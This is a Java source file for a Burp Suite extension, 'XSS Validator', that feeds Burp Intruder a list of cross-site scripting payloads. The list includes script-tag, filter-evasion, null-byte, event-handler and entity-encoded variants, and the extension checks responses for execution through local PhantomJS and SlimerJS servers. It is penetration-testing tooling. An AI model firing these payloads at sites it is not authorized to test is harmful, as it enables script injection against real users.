package burp;

import java.awt.BorderLayout;
import java.awt.Component;
import java.awt.Dimension;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTextArea;
import javax.swing.JTextField;
import javax.swing.ScrollPaneConstants;
import javax.swing.SwingUtilities;

import org.apache.commons.codec.binary.Base64;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;


public class BurpExtender implements IBurpExtender, ITab, IHttpListener,
IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor {

    class IntruderPayloadGenerator implements IIntruderPayloadGenerator {

        int          payloadIndex;
        String[]     functions         = {"alert", "console.log", "confirm",
                                               "prompt"};
        String[]     eventHandler      = null;
        int          functionIndex     = 0;
        int          eventHandlerIndex = 0;
        BurpExtender extenderInstance  = null;
        String[]     PAYLOADS          = null;

        IntruderPayloadGenerator(BurpExtender extenderInstance) {

            this.extenderInstance = extenderInstance;
            this.functions = extenderInstance.functionsTextfield.getText()
                    .split(",");
            this.eventHandler = extenderInstance.eventHandlerTextfield
                    .getText().split(",");
            this.PAYLOADS = extenderInstance.attackStringsTextarea.getText()
                    .split("\n");

        }

        public byte[] getNextPayload(byte[] baseValue) {

            if ((this.eventHandler.length > 0)
                    && (this.eventHandlerIndex >= this.eventHandler.length)) {
                this.eventHandlerIndex = 0;
                this.functionIndex += 1;
            }

            if (this.functionIndex >= this.functions.length) {
                this.functionIndex = 0;
                this.eventHandlerIndex = 0;
                this.payloadIndex += 1;
            }

            String payload = this.PAYLOADS[this.payloadIndex];
            boolean eventhandlerIsUsed = payload
                    .contains(BurpExtender.EVENTHANDLER_PLACEHOLDER);


            // String nextPayload = new String(payload);
            if (eventhandlerIsUsed) {
                payload = payload.replace(
                        BurpExtender.EVENTHANDLER_PLACEHOLDER,
                        this.eventHandler[this.eventHandlerIndex]);
            }

            payload = payload.replace(BurpExtender.JAVASCRIPT_PLACEHOLDER,
                    this.functions[this.functionIndex] + "("
                            + BurpExtender.triggerPhrase + ")");


            BurpExtender.this.stdout.println("Payload conversion: " + payload);

            if (!eventhandlerIsUsed) {
                this.functionIndex += 1;
            }
            else {
                this.eventHandlerIndex += 1;
            }
            return payload.getBytes();
        }

        public boolean hasMorePayloads() {

            return this.payloadIndex < BurpExtender.PAYLOADS.length;
        }

        public void reset() {

            this.payloadIndex = 0;
        }
    }

    public IBurpExtenderCallbacks mCallbacks;
    private IExtensionHelpers     helpers;
    private PrintWriter           stdout;
    private PrintWriter           stderr;
    private HttpClient            client;
    private static String         phantomServer            = "http://127.0.0.1:8093";

    private static String         slimerServer             = "http://127.0.0.1:8094";

    private static String         triggerPhrase            = "299792458";
    private static String         grepPhrase               = "fy7sdufsuidfhuisdf";
    public JPanel                 mainPanel;
    public JPanel                 serverConfig;
    public JTextField             phantomURL;
    public JTextField             slimerURL;
    public JTextField             grepVal;
    public JTabbedPane            tabbedPane;
    public JButton                btnAddText;
    public JButton                btnSaveTabAsTemplate;
    public JButton                btnRemoveTab;
    public JTextField             functionsTextfield;
    public JTextArea              attackStringsTextarea;
    public JTextField             eventHandlerTextfield;
    public JScrollPane            scrollingArea;
    public static final String    JAVASCRIPT_PLACEHOLDER   = "{JAVASCRIPT}";
    public static final String    EVENTHANDLER_PLACEHOLDER = "{EVENTHANDLER}";


    public static final byte[][]  PAYLOADS                 = {
            ("<script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script>")
        .getBytes(),
            ("<scr ipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr ipt>")
                    .getBytes(),
            ("\"><script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script>")
                    .getBytes(),
            ("\"><script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script><\"")
                    .getBytes(),
            ("'><script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script>")
                    .getBytes(),
            ("'><script>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</script><'")
        .getBytes(),
            ("<SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</SCRIPT>")
        .getBytes(),
            ("<scri<script>pt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</scr</script>ipt>")
        .getBytes(),
            ("<SCRI<script>PT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</SCR</script>IPT>")
        .getBytes(),
            ("<scri<scr<script>ipt>pt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</scr</sc</script>ript>ipt>")
                    .getBytes(),
        ("\";" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";\"").getBytes(),
            ("';" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";'").getBytes(),
        (";" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";").getBytes(),
            ("<SCR%00IPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</SCR%00IPT>")
        .getBytes(),
            ("\\\";" + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";//").getBytes(),
            ("<STYLE TYPE=\"text/javascript\">"
                + BurpExtender.JAVASCRIPT_PLACEHOLDER + ";</STYLE>")
                .getBytes(),
            ("<scr%0ipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr%0ipt>")
                .getBytes(),
            ("<scr%0ipt>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "</scr%0ipt>")
                .getBytes(),
            ("<<SCRIPT>" + BurpExtender.JAVASCRIPT_PLACEHOLDER + "//<</SCRIPT>")
                .getBytes(),
            ("\"" + BurpExtender.EVENTHANDLER_PLACEHOLDER + "="
                    + BurpExtender.JAVASCRIPT_PLACEHOLDER + " ").getBytes()};

    public static final byte[][]  NONPAYLOADS              = {
        ("<img src=x onerror=alert('" + BurpExtender.triggerPhrase + "')>")
        .getBytes(),
        ("<svg xmlns=\"http://www.w3.org/2000/svg\"><g onload=\"javascript:alert('"
                + BurpExtender.triggerPhrase + "')></g></svg>").getBytes(),
                ("&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;"
                        + BurpExtender.triggerPhrase + "&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;")
                        .getBytes()                            };

    public IIntruderPayloadGenerator createNewInstance(IIntruderAttack attack) {

        return new IntruderPayloadGenerator(this);
    }

    public String getGeneratorName() {

        return "XSS Validator Payloads";
    }

    public String getProcessorName() {

        return "XSS Validator";
    }

    public String getTabCaption() {

        return "xssValidator";
    }

    public Component getUiComponent() {

        return this.mainPanel;
    }

    public void processHttpMessage(int toolFlag, boolean messageIsRequest,
            IHttpRequestResponse messageInfo) {

        if ((toolFlag != 32) || (!messageIsRequest)) {
            if ((toolFlag == 32) && (!messageIsRequest)) {
                HttpPost PhantomJs = new HttpPost(this.phantomURL.getText());
                HttpPost SlimerJS = new HttpPost(this.slimerURL.getText());
                try {
                    byte[] encodedBytes = Base64.encodeBase64(messageInfo
                            .getResponse());
                    String encodedResponse = this.helpers
                            .bytesToString(encodedBytes);

                    List nameValuePairs = new ArrayList(1);
                    nameValuePairs.add(new BasicNameValuePair("http-response",
                            encodedResponse));

                    PhantomJs
                    .setEntity(new UrlEncodedFormEntity(nameValuePairs));

                    HttpResponse response = this.client.execute(PhantomJs);
                    String responseAsString = EntityUtils.toString(response
                            .getEntity());

                    this.stdout.println("Response: " + responseAsString);

                    if (responseAsString.toLowerCase().contains(
                            BurpExtender.triggerPhrase.toLowerCase())) {
                        String newResponse = this.helpers
                                .bytesToString(messageInfo.getResponse())
                                + this.grepVal.getText();
                        messageInfo.setResponse(this.helpers
                                .stringToBytes(newResponse));
                        this.stdout.println("XSS Found");
                    }
                }catch (Exception e) {
                    this.stderr.println(e.getMessage());
                }

                try {
                    byte[] encodedBytes = Base64.encodeBase64(messageInfo
                            .getResponse());
                    String encodedResponse = this.helpers
                            .bytesToString(encodedBytes);

                    List nameValuePairs = new ArrayList(1);
                    nameValuePairs.add(new BasicNameValuePair("http-response",
                            encodedResponse));

                    SlimerJS.setEntity(new UrlEncodedFormEntity(nameValuePairs));

                    HttpResponse response = this.client.execute(SlimerJS);
                    String responseAsString = EntityUtils.toString(response
                            .getEntity());

                    this.stdout.println("Response: " + responseAsString);

                    if (responseAsString.toLowerCase().contains(
                            BurpExtender.triggerPhrase.toLowerCase())) {
                        String newResponse = this.helpers
                                .bytesToString(messageInfo.getResponse())
                                + this.grepVal.getText();
                        messageInfo.setResponse(this.helpers
                                .stringToBytes(newResponse));
                        this.stdout.println("XSS Found");
                    }
                }catch (Exception e) {
                    this.stderr.println(e.getMessage());
                }
            }
        }
    }

    public byte[] processPayload(byte[] currentPayload, byte[] originalPayload,
            byte[] baseValue) {

        return this.helpers.stringToBytes(this.helpers.urlEncode(this.helpers
                .bytesToString(currentPayload)));
    }

    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {

        this.mCallbacks = callbacks;

        this.client = HttpClientBuilder.create().build();
        this.helpers = callbacks.getHelpers();
        callbacks.setExtensionName("XSS Validator Payloads");
        this.stdout = new PrintWriter(callbacks.getStdout(), true);
        this.stderr = new PrintWriter(callbacks.getStderr(), true);
        callbacks.registerIntruderPayloadGeneratorFactory(this);
        callbacks.registerIntruderPayloadProcessor(this);
        callbacks.registerHttpListener(this);

        SwingUtilities.invokeLater(new Runnable() {

            public void run() {

                BurpExtender.this.functionsTextfield = new JTextField(30);
                BurpExtender.this.functionsTextfield
                        .setText("alert,console.log,confirm,prompt");

                BurpExtender.this.eventHandlerTextfield = new JTextField(30);
                BurpExtender.this.eventHandlerTextfield
                .setText("onmousemove,onmouseout,onmouseover");

                String payloads = "";
                for (byte[] bs:BurpExtender.PAYLOADS) {
                    payloads += new String(bs) + "\n";
                }

                BurpExtender.this.attackStringsTextarea = new JTextArea(30, 50);
                BurpExtender.this.attackStringsTextarea.setText(payloads);
                // BurpExtender.this.attackStringsTextarea
                // .setPreferredSize(new Dimension(600, 600));
                BurpExtender.this.scrollingArea = new JScrollPane(
                        BurpExtender.this.attackStringsTextarea,
                        ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS,
                        ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);

                BurpExtender.this.mainPanel = new JPanel(new BorderLayout());

                BurpExtender.this.serverConfig = new JPanel();
                BurpExtender.this.serverConfig.setPreferredSize(new Dimension(
                        400, 400));

                BurpExtender.this.phantomURL = new JTextField(20);
                BurpExtender.this.phantomURL
                        .setText(BurpExtender.phantomServer);

                BurpExtender.this.slimerURL = new JTextField(20);
                BurpExtender.this.slimerURL.setText(BurpExtender.slimerServer);

                BurpExtender.this.grepVal = new JTextField(20);
                BurpExtender.this.grepVal.setText(BurpExtender.grepPhrase);

                JLabel phantomHeading = new JLabel("PhantomJS Server Settings");
                JLabel slimerHeading = new JLabel("Slimer Server Settings");
                JLabel grepHeading = new JLabel("Grep Phrase");
                BurpExtender.this.serverConfig.add(phantomHeading);
                BurpExtender.this.serverConfig
                        .add(BurpExtender.this.phantomURL);

                BurpExtender.this.serverConfig.add(slimerHeading);
                BurpExtender.this.serverConfig.add(BurpExtender.this.slimerURL);

                BurpExtender.this.serverConfig.add(grepHeading);
                BurpExtender.this.serverConfig.add(BurpExtender.this.grepVal);

                JLabel functionsLabel = new JLabel("Javascript functions");
                BurpExtender.this.serverConfig.add(functionsLabel);
                BurpExtender.this.serverConfig
                .add(BurpExtender.this.functionsTextfield);

                JLabel eventHandlerLabel = new JLabel(
                        "Javascript event handlers");
                BurpExtender.this.serverConfig.add(eventHandlerLabel);
                BurpExtender.this.serverConfig
                .add(BurpExtender.this.eventHandlerTextfield);

                BurpExtender.this.serverConfig
                        .add(BurpExtender.this.scrollingArea);

                BurpExtender.this.mainPanel.add(BurpExtender.this.serverConfig);
                BurpExtender.this.mCallbacks
                        .customizeUiComponent(BurpExtender.this.mainPanel);
                BurpExtender.this.mCallbacks.addSuiteTab(BurpExtender.this);
            }
        });
    }
}
